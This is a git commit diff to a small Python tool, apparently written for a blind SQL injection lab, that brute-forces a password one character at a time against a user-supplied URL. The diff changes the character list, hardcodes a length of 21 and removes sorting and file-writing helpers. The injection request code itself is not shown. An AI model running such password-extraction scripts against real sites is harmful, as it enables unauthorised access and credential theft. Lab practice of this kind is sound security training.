cf68a2eca569054601c5b997fd9f661ee79a4463
Fmafu <107658869+Fmafu@users.noreply.github.com>
2023-05-15 22:35:48 +0700

    m

--- Blind SQL injection with conditional responses/script-sqli-main/PassFinder.py
+++ Blind SQL injection with conditional responses/script-sqli-main/PassFinder.py
@@ -1,10 +1,11 @@
 import requests
-length =input()
+
+
 class PassFinder:
-    array = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
+    array = ['0', '1', '2', '3','4', '5', '6', '7', '8', '9',
+             'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
          'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
-         'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
-         '4', '5', '6', '7', '8', '9']
+         'u', 'v', 'w', 'x', 'y', 'z']
 
     def __init__(self, url):
         self.url = url
@@ -54,29 +55,10 @@ class PassFinder:
         return index != -1
 
 
-    def bubbleSortByPosition(self, inputArr):
-        n = len(inputArr)
-        for i in range(n):
-            already_sorted = True
-            for j in range(n - i - 1):
-                if inputArr[j]['position'] > inputArr[j + 1]['position']:
-                    inputArr[j], inputArr[j + 1] = inputArr[j + 1], inputArr[j]
-                    already_sorted = False
-            if already_sorted:
-                break
-        return inputArr
-
-
-    def writeResultToTxt(self, inputArr):
-        text_file = open("password.txt", "w")
-        password = ''.join(inputArr)
-        text_file.write(password)
-        text_file.close()
-
 
     def findPass(self):
         for char in self.array:
-            for number in range(length):
+            for number in range(21):
                 if (number == 0):
                     continue
                 self.handleRequest(number, char)
--- Blind SQL injection with conditional responses/script-sqli-main/main.py
+++ Blind SQL injection with conditional responses/script-sqli-main/main.py
@@ -1,5 +1,7 @@
 import PassFinder
+print ("url: ")
 x = input()
 url = x
 object = PassFinder.PassFinder(url)
+
 object.findPass()
